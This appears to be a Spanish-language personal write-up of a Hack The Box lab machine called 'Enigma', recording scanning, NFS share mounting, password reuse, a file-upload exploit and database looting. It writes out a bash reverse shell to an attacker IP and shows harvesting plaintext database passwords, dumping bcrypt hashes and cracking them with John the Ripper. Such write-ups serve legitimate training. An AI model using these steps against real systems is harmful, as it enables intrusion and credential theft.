___
#linux #active
___
## Nmap

### Identificiacion de puertos
```sh
nmap -p- --open -sS -Pn -n -vvv --min-rate 5000 -oG all_ports 10.129.136.128

# Nmap 7.98 scan initiated Wed Oct 21 10:35:42 2026 as: nmap -p- --open -sS -Pn -n -vvv --min-rate 5000 -oG all_ports 10.129.136.128
   2   │ # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
   3   │ Host: 10.129.136.128 () Status: Up
   4   │ Host: 10.129.136.128 () Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 110/open/tcp//pop3///, 111/open/tcp//rpcbind///, 143/open/tcp//imap///, 993/open/tcp//imaps///, 995/o
       │ pen/tcp//pop3s///, 2049/open/tcp//nfs///, 38619/open/tcp/////, 40939/open/tcp/////, 46623/open/tcp/////, 51893/open/tcp/////, 57361/open/tcp/////
   5   │ # Nmap done at Wed Oct 21 10:36:00 2026 -- 1 IP address (1 host up) scanned in 18.01 seconds
```

### Identifiacion de los servicios
```sh

nmap -p22,80,110,111,143,993,995,2049,38619,40939,46623,51893,57361 -sCV -vvv --min-rate 5000 -oN services 10.129.136.1

# Nmap 7.98 scan initiated Wed Oct 21 10:40:27 2026 as: nmap -p22,80,110,111,143,993,995,2049,38619,40939,46623,51893,57361 -sCV -vvv --min-rate 5000 -oN services 10.129.136.1
       │ 28
   2   │ Nmap scan report for enigma.htb (10.129.136.128)
   3   │ Host is up, received conn-refused (0.16s latency).
   4   │ Scanned at 2026-10-21 10:40:28 -03 for 22s
   5   │
   6   │ PORT      STATE SERVICE  REASON  VERSION
   7   │ 22/tcp    open  ssh      syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
   8   │ | ssh-hostkey:
   9   │ |   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
  10   │ | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9Ju3bTZsFozwXY1B2KIlEY4BA+RcNM57w4C5EjOw1QegUUyCJoO4TVOKfzy/9kd3WrPEj/FYKT2agja9/PM44=
  11   │ |   256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
  12   │ |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH9qI0OvMyp03dAGXR0UPdxw7hjSwMR773Yb9Sne+7vD
  13   │ 80/tcp    open  http     syn-ack nginx 1.24.0 (Ubuntu)
  14   │ |_http-title: Enigma Corp \xE2\x80\x94 Managed IT Solutions
  15   │ |_http-server-header: nginx/1.24.0 (Ubuntu)
  16   │ | http-methods:
  17   │ |_  Supported Methods: GET HEAD
  18   │ 110/tcp   open  pop3     syn-ack Dovecot pop3d
  19   │ |_ssl-date: TLS randomness does not represent time
  20   │ |_pop3-capabilities: PIPELINING CAPA UIDL TOP SASL STLS AUTH-RESP-CODE RESP-CODES
  21   │ | ssl-cert: Subject: commonName=enigma
  22   │ | Subject Alternative Name: DNS:enigma
  23   │ | Issuer: commonName=enigma
  24   │ | Public Key type: rsa
  25   │ | Public Key bits: 2048
  26   │ | Signature Algorithm: sha256WithRSAEncryption
  27   │ | Not valid before: 2026-02-18T20:33:33
  28   │ | Not valid after:  2036-02-16T20:33:33
  29   │ | MD5:     8361 ca20 2e4e dff6 6e90 1445 7458 9fc3
  30   │ | SHA-1:   9f91 b6ed 85b4 517c 0421 c62e 167d 5631 daa6 5a40
  31   │ | SHA-256: 98a8 1f62 b59c 832a 162e 2394 9e41 1e08 46a0 f7c1 529f afcb ea15 eea5 ef52 bb70
  32   │ | -----BEGIN CERTIFICATE-----
  33   │ | MIIC7zCCAdegAwIBAgIUDIVPMnvnZ7MqOX9P3XD6FaMUGLYwDQYJKoZIhvcNAQEL
  34   │ | BQAwETEPMA0GA1UEAwwGZW5pZ21hMB4XDTI2MDIxODIwMzMzM1oXDTM2MDIxNjIw
  35   │ | MzMzM1owETEPMA0GA1UEAwwGZW5pZ21hMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
  36   │ | MIIBCgKCAQEAkSnxU+24XgWM3KXxLy4mCk7AclfQyAQlcr8Gm7L3E3gdkF74wSZy
  37   │ | i00pixUHKlKqrPQwSpNqsWMqi1ggBZQzd2jBRKzpQQflMUzI8uoUjkBlaFqKCli5
  38   │ | cJgyL/WcOylWDTdBXeIyBUBDN1duzVa/BDTV83inPH+Fs5rpesSJ/Jwsv4432dtb
  39   │ | SGAe6YuR4PIpgI33GvPoW3uSfE/yMGffwRf0RONTcsbsNC8reb3XKqa9eNfrmYb3
  40   │ | S9/L/3dK04fZRU1gk4vRt0xY60VSgQXJqQwfsTUxcNqwYL0bZ0u5bEfV6ITwNO5F
  41   │ | DZ11EkqkJCFx6pVgWRmnfC0XNMi5IHW3mwIDAQABoz8wPTAJBgNVHRMEAjAAMBEG
  42   │ | A1UdEQQKMAiCBmVuaWdtYTAdBgNVHQ4EFgQUHA8z2wPX5Qj2TV6SafL8f2LRoDsw
  43   │ | DQYJKoZIhvcNAQELBQADggEBADr3VEq/+YzDltVRbBvjGeCCm2A2+5nAniEJE/oA
  44   │ | CkQDVHgYrMH/7L0z0kocq0e54Mk+iRRPKjP4bF4FhG2syeaE2o1aqH6C3GIoBvRZ
  45   │ | 79XCkgxf5XDlECId1en+KS+iX2ssSmFWEU7l9+OnIRY1QA91OekD2OznIfAeXjaw
  46   │ | O4SWzae1MrGM0venQ1RugTWa9JoL6G2BUtqIGDyw3QRxmx3HKStMtfHqdq2vzFjA
  47   │ | LsK4A5j7mMDujaq55Nsc4/Su0ShQKPW3A1X7C1Y9c492g9Z0R5GL17CrmYJIVPX2
  48   │ | +LC3TWgrRUQ6i5qZ7/9jU198FGNUlRGQi304f+XlxhVqTHI=
  49   │ |_-----END CERTIFICATE-----
  50   │ 111/tcp   open  rpcbind  syn-ack 2-4 (RPC #100000)
  51   │ | rpcinfo:
  52   │ |   program version    port/proto  service
  53   │ |   100000  2,3,4        111/tcp   rpcbind
  54   │ |   100000  2,3,4        111/udp   rpcbind
  55   │ |   100000  3,4          111/tcp6  rpcbind
  56   │ |   100000  3,4          111/udp6  rpcbind
  57   │ |   100003  3,4         2049/tcp   nfs
  58   │ |   100003  3,4         2049/tcp6  nfs
  59   │ |   100005  1,2,3      37849/tcp6  mountd
  60   │ |   100005  1,2,3      46623/tcp   mountd
  61   │ |   100005  1,2,3      46955/udp6  mountd
  62   │ |   100005  1,2,3      60000/udp   mountd
  63   │ |   100021  1,3,4      38619/tcp   nlockmgr
  64   │ |   100021  1,3,4      40631/udp6  nlockmgr
  65   │ |   100021  1,3,4      43265/tcp6  nlockmgr
  66   │ |   100021  1,3,4      45058/udp   nlockmgr
  67   │ |   100024  1          33605/udp6  status
  68   │ |   100024  1          40939/tcp   status
  69   │ |   100024  1          50441/tcp6  status
  70   │ |   100024  1          56794/udp   status
  71   │ |   100227  3           2049/tcp   nfs_acl
  72   │ |_  100227  3           2049/tcp6  nfs_acl
  73   │ 143/tcp   open  imap     syn-ack Dovecot imapd (Ubuntu)
  74   │ |_imap-capabilities: more LOGIN-REFERRALS Pre-login STARTTLS OK listed IDLE LITERAL+ ENABLE ID have SASL-IR LOGINDISABLEDA0001 IMAP4rev1 capabilities post-login
  75   │ | ssl-cert: Subject: commonName=enigma
  76   │ | Subject Alternative Name: DNS:enigma
  77   │ | Issuer: commonName=enigma
  78   │ | Public Key type: rsa
  79   │ | Public Key bits: 2048
  80   │ | Signature Algorithm: sha256WithRSAEncryption
  81   │ | Not valid before: 2026-02-18T20:33:33
  82   │ | Not valid after:  2036-02-16T20:33:33
  83   │ | MD5:     8361 ca20 2e4e dff6 6e90 1445 7458 9fc3
  84   │ | SHA-1:   9f91 b6ed 85b4 517c 0421 c62e 167d 5631 daa6 5a40
  85   │ | SHA-256: 98a8 1f62 b59c 832a 162e 2394 9e41 1e08 46a0 f7c1 529f afcb ea15 eea5 ef52 bb70
  86   │ | -----BEGIN CERTIFICATE-----
  87   │ | MIIC7zCCAdegAwIBAgIUDIVPMnvnZ7MqOX9P3XD6FaMUGLYwDQYJKoZIhvcNAQEL
  88   │ | BQAwETEPMA0GA1UEAwwGZW5pZ21hMB4XDTI2MDIxODIwMzMzM1oXDTM2MDIxNjIw
  89   │ | MzMzM1owETEPMA0GA1UEAwwGZW5pZ21hMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
  90   │ | MIIBCgKCAQEAkSnxU+24XgWM3KXxLy4mCk7AclfQyAQlcr8Gm7L3E3gdkF74wSZy
  91   │ | i00pixUHKlKqrPQwSpNqsWMqi1ggBZQzd2jBRKzpQQflMUzI8uoUjkBlaFqKCli5
  92   │ | cJgyL/WcOylWDTdBXeIyBUBDN1duzVa/BDTV83inPH+Fs5rpesSJ/Jwsv4432dtb
  93   │ | SGAe6YuR4PIpgI33GvPoW3uSfE/yMGffwRf0RONTcsbsNC8reb3XKqa9eNfrmYb3
  94   │ | S9/L/3dK04fZRU1gk4vRt0xY60VSgQXJqQwfsTUxcNqwYL0bZ0u5bEfV6ITwNO5F
  95   │ | DZ11EkqkJCFx6pVgWRmnfC0XNMi5IHW3mwIDAQABoz8wPTAJBgNVHRMEAjAAMBEG
  96   │ | A1UdEQQKMAiCBmVuaWdtYTAdBgNVHQ4EFgQUHA8z2wPX5Qj2TV6SafL8f2LRoDsw
  97   │ | DQYJKoZIhvcNAQELBQADggEBADr3VEq/+YzDltVRbBvjGeCCm2A2+5nAniEJE/oA
  98   │ | CkQDVHgYrMH/7L0z0kocq0e54Mk+iRRPKjP4bF4FhG2syeaE2o1aqH6C3GIoBvRZ
  99   │ | 79XCkgxf5XDlECId1en+KS+iX2ssSmFWEU7l9+OnIRY1QA91OekD2OznIfAeXjaw
 100   │ | O4SWzae1MrGM0venQ1RugTWa9JoL6G2BUtqIGDyw3QRxmx3HKStMtfHqdq2vzFjA
 101   │ | LsK4A5j7mMDujaq55Nsc4/Su0ShQKPW3A1X7C1Y9c492g9Z0R5GL17CrmYJIVPX2
 102   │ | +LC3TWgrRUQ6i5qZ7/9jU198FGNUlRGQi304f+XlxhVqTHI=
 103   │ |_-----END CERTIFICATE-----
 104   │ |_ssl-date: TLS randomness does not represent time
 105   │ 993/tcp   open  ssl/imap syn-ack Dovecot imapd (Ubuntu)
 106   │ |_imap-capabilities: LOGIN-REFERRALS Pre-login LITERAL+ OK AUTH=PLAINA0001 IDLE more ENABLE ID have SASL-IR capabilities IMAP4rev1 listed post-login
 107   │ | ssl-cert: Subject: commonName=enigma
 108   │ | Subject Alternative Name: DNS:enigma
 109   │ | Issuer: commonName=enigma
 110   │ | Public Key type: rsa
 111   │ | Public Key bits: 2048
 112   │ | Signature Algorithm: sha256WithRSAEncryption
 113   │ | Not valid before: 2026-02-18T20:33:33
 114   │ | Not valid after:  2036-02-16T20:33:33
 115   │ | MD5:     8361 ca20 2e4e dff6 6e90 1445 7458 9fc3
 116   │ | SHA-1:   9f91 b6ed 85b4 517c 0421 c62e 167d 5631 daa6 5a40
 117   │ | SHA-256: 98a8 1f62 b59c 832a 162e 2394 9e41 1e08 46a0 f7c1 529f afcb ea15 eea5 ef52 bb70
 118   │ | -----BEGIN CERTIFICATE-----
 119   │ | MIIC7zCCAdegAwIBAgIUDIVPMnvnZ7MqOX9P3XD6FaMUGLYwDQYJKoZIhvcNAQEL
 120   │ | BQAwETEPMA0GA1UEAwwGZW5pZ21hMB4XDTI2MDIxODIwMzMzM1oXDTM2MDIxNjIw
 121   │ | MzMzM1owETEPMA0GA1UEAwwGZW5pZ21hMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
 122   │ | MIIBCgKCAQEAkSnxU+24XgWM3KXxLy4mCk7AclfQyAQlcr8Gm7L3E3gdkF74wSZy
 123   │ | i00pixUHKlKqrPQwSpNqsWMqi1ggBZQzd2jBRKzpQQflMUzI8uoUjkBlaFqKCli5
 124   │ | cJgyL/WcOylWDTdBXeIyBUBDN1duzVa/BDTV83inPH+Fs5rpesSJ/Jwsv4432dtb
 125   │ | SGAe6YuR4PIpgI33GvPoW3uSfE/yMGffwRf0RONTcsbsNC8reb3XKqa9eNfrmYb3
 126   │ | S9/L/3dK04fZRU1gk4vRt0xY60VSgQXJqQwfsTUxcNqwYL0bZ0u5bEfV6ITwNO5F
 127   │ | DZ11EkqkJCFx6pVgWRmnfC0XNMi5IHW3mwIDAQABoz8wPTAJBgNVHRMEAjAAMBEG
 128   │ | A1UdEQQKMAiCBmVuaWdtYTAdBgNVHQ4EFgQUHA8z2wPX5Qj2TV6SafL8f2LRoDsw
 129   │ | DQYJKoZIhvcNAQELBQADggEBADr3VEq/+YzDltVRbBvjGeCCm2A2+5nAniEJE/oA
 130   │ | CkQDVHgYrMH/7L0z0kocq0e54Mk+iRRPKjP4bF4FhG2syeaE2o1aqH6C3GIoBvRZ
 131   │ | 79XCkgxf5XDlECId1en+KS+iX2ssSmFWEU7l9+OnIRY1QA91OekD2OznIfAeXjaw
 132   │ | O4SWzae1MrGM0venQ1RugTWa9JoL6G2BUtqIGDyw3QRxmx3HKStMtfHqdq2vzFjA
 133   │ | LsK4A5j7mMDujaq55Nsc4/Su0ShQKPW3A1X7C1Y9c492g9Z0R5GL17CrmYJIVPX2
 134   │ | +LC3TWgrRUQ6i5qZ7/9jU198FGNUlRGQi304f+XlxhVqTHI=
 135   │ |_-----END CERTIFICATE-----
 136   │ |_ssl-date: TLS randomness does not represent time
 137   │ 995/tcp   open  ssl/pop3 syn-ack Dovecot pop3d
 138   │ |_pop3-capabilities: PIPELINING CAPA UIDL TOP SASL(PLAIN) USER AUTH-RESP-CODE RESP-CODES
 139   │ | ssl-cert: Subject: commonName=enigma
 140   │ | Subject Alternative Name: DNS:enigma
 141   │ | Issuer: commonName=enigma
 142   │ | Public Key type: rsa
 143   │ | Public Key bits: 2048
 144   │ | Signature Algorithm: sha256WithRSAEncryption
 145   │ | Not valid before: 2026-02-18T20:33:33
 146   │ | Not valid after:  2036-02-16T20:33:33
 147   │ | MD5:     8361 ca20 2e4e dff6 6e90 1445 7458 9fc3
 148   │ | SHA-1:   9f91 b6ed 85b4 517c 0421 c62e 167d 5631 daa6 5a40
 149   │ | SHA-256: 98a8 1f62 b59c 832a 162e 2394 9e41 1e08 46a0 f7c1 529f afcb ea15 eea5 ef52 bb70
 150   │ | -----BEGIN CERTIFICATE-----
 151   │ | MIIC7zCCAdegAwIBAgIUDIVPMnvnZ7MqOX9P3XD6FaMUGLYwDQYJKoZIhvcNAQEL
 152   │ | BQAwETEPMA0GA1UEAwwGZW5pZ21hMB4XDTI2MDIxODIwMzMzM1oXDTM2MDIxNjIw
 153   │ | MzMzM1owETEPMA0GA1UEAwwGZW5pZ21hMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
 154   │ | MIIBCgKCAQEAkSnxU+24XgWM3KXxLy4mCk7AclfQyAQlcr8Gm7L3E3gdkF74wSZy
 155   │ | i00pixUHKlKqrPQwSpNqsWMqi1ggBZQzd2jBRKzpQQflMUzI8uoUjkBlaFqKCli5
 156   │ | cJgyL/WcOylWDTdBXeIyBUBDN1duzVa/BDTV83inPH+Fs5rpesSJ/Jwsv4432dtb
 157   │ | SGAe6YuR4PIpgI33GvPoW3uSfE/yMGffwRf0RONTcsbsNC8reb3XKqa9eNfrmYb3
 158   │ | S9/L/3dK04fZRU1gk4vRt0xY60VSgQXJqQwfsTUxcNqwYL0bZ0u5bEfV6ITwNO5F
 159   │ | DZ11EkqkJCFx6pVgWRmnfC0XNMi5IHW3mwIDAQABoz8wPTAJBgNVHRMEAjAAMBEG
 160   │ | A1UdEQQKMAiCBmVuaWdtYTAdBgNVHQ4EFgQUHA8z2wPX5Qj2TV6SafL8f2LRoDsw
 161   │ | DQYJKoZIhvcNAQELBQADggEBADr3VEq/+YzDltVRbBvjGeCCm2A2+5nAniEJE/oA
 162   │ | CkQDVHgYrMH/7L0z0kocq0e54Mk+iRRPKjP4bF4FhG2syeaE2o1aqH6C3GIoBvRZ
 163   │ | 79XCkgxf5XDlECId1en+KS+iX2ssSmFWEU7l9+OnIRY1QA91OekD2OznIfAeXjaw
 164   │ | O4SWzae1MrGM0venQ1RugTWa9JoL6G2BUtqIGDyw3QRxmx3HKStMtfHqdq2vzFjA
 165   │ | LsK4A5j7mMDujaq55Nsc4/Su0ShQKPW3A1X7C1Y9c492g9Z0R5GL17CrmYJIVPX2
 166   │ | +LC3TWgrRUQ6i5qZ7/9jU198FGNUlRGQi304f+XlxhVqTHI=
 167   │ |_-----END CERTIFICATE-----
 168   │ |_ssl-date: TLS randomness does not represent time
 169   │ 2049/tcp  open  nfs_acl  syn-ack 3 (RPC #100227)
 170   │ 38619/tcp open  nlockmgr syn-ack 1-4 (RPC #100021)
 171   │ 40939/tcp open  status   syn-ack 1 (RPC #100024)
 172   │ 46623/tcp open  mountd   syn-ack 1-3 (RPC #100005)
 173   │ 51893/tcp open  mountd   syn-ack 1-3 (RPC #100005)
 174   │ 57361/tcp open  mountd   syn-ack 1-3 (RPC #100005)
 175   │ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 176   │
 177   │ Read data files from: /usr/bin/../share/nmap
 178   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 179   │ # Nmap done at Wed Oct 21 10:40:50 2026 -- 1 IP address (1 host up) scanned in 23.57 second
```

## Whatweb
- nginx : nginx/1.24
- email: support@enigma.htb
### Informacion pagina web
- email: support@enigma.htb 
## NFS

### Network File System
Son Archivos compartidos a traves de la red

### Exploracion
```sh
showmount -e 10.129.136.128

# Response
Export list for 10.129.136.128:
/srv/nfs/onboarding *
```

### Nos traemos la carpeta montandola
```sh
sudo mount -t nfs 10.129.136.128:/srv/nfs/onboarding /home/chicoj2ck/Desktop/hack-the-box/Easy/Enigma/content/onboarding
```

Y dentro hay un pdf  `New_Employee_Access.pdf`

####  Informacion del PDF
- Nombre: Kevin Mitchell
- Web: http://mail001.enigma.htb/
- username: kevin
- pass: Enigma2024!


- correo de soporte nuevo: it@enigma.htb


### Dentro del imbox de Kevin
listado de correos encontrados:
- sara@enigma.htb
  
  
Probamos reautilizar la contraseña...

### Correo de Sarah
- web: [http://support_001.enigma.htb](http://support_001.enigma.htb)
- username: admin
- pass: Ne3s4rtars78s
### Vulnerabilidad 
- [subida de archivo maliciosoh](ttps://github.com/advisories/GHSA-25fp-8w8p-mx36)

```sh
# mandamos la reverse shell, pero se urlencodea todo, hasta los simbolos especiales
bash -c "bash -i >& /dev/tcp/10.10.17.250/443 0>&1"
```

### Luego tratamos la tty y buscamos información
Encontramos un archivo config.ini.php en la ruta `~/html/roundcube/`

### Roundcube Config.ini.php 
- link: mysql://roundcube:Yo270x26!gTx02@localhost/roundcubemail
- user: roundcube

```sh
mysql -h localhost -P 3306 -u roundcube -p roundcubemail

# información de la db

+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+---------------------------------------------------+
| user_id | username | mail_host | created             | last_login          | failed_login        | failed_login_counter | language | preferences                                       |
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+---------------------------------------------------+
|       1 | kevin    | localhost | 2026-05-26 11:00:00 | 2026-05-26 11:10:22 | 2026-05-26 11:10:06 |                    1 | en_US    | a:1:{s:11:"client_hash";s:16:"jXKCkTD6NJX1CfH7";} |
|       2 | sarah    | localhost | 2026-05-26 11:01:39 | 2026-05-26 11:01:39 | NULL                |                 NULL | en_US    | a:1:{s:11:"client_hash";s:16:"E2t73i4vcknHDz71";} |
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+---------------------------------------------------+
```

Seguimos buscando cosas y encontramos otro archivo config
```sh
# busqueda recursiva 
grep -rn --include="*.php" "pass" ~/html/ --exclude-dir={vendor,node_modules,cache,templates,include,plugins,src,modules,program}

# vemos esto: /var/www/html/openstamanager/config.inc.php:24:$db_password = 'Fri3nds@9099';
# leemos el archivo
$db_host = 'localhost';
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name = 'openstamanager';

# nos conectamos
mysql -h localhost -P 3306 -u brollin -p openstamanager

# encontramos en DB: Openstamanager
mysql> select * from zz_users;
+----+----------+--------------------------------------------------------------+------------------+--------------+----------+---------+---------------------+---------------------+-------------+---------------+---------+
| id | username | password                                                     | email            | idanagrafica | idgruppo | enabled | created_at          | updated_at          | reset_token | image_file_id | options |
+----+----------+--------------------------------------------------------------+------------------+--------------+----------+---------+---------------------+---------------------+-------------+---------------+---------+
|  1 | admin    | $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu | admin@enigma.htb |            1 |        1 |       1 | 2026-02-18 19:26:52 | 2026-02-18 19:26:52 | NULL        |          NULL |         |
|  2 | haris    | $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC | haris@enigma.htb |            1 |        5 |       1 | 2026-02-18 20:58:28 | 2026-05-26 11:07:03 | NULL        |          NULL |         |
+----+----------+--------------------------------------------------------------+------------------+--------------+----------+---------+---------------------+---------------------+-------------+---------------+---------+

```

### Aplicando John The Ripper
```sh
# creo un archivo hashes.txt y se lo paso 
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Respuesta
```

 


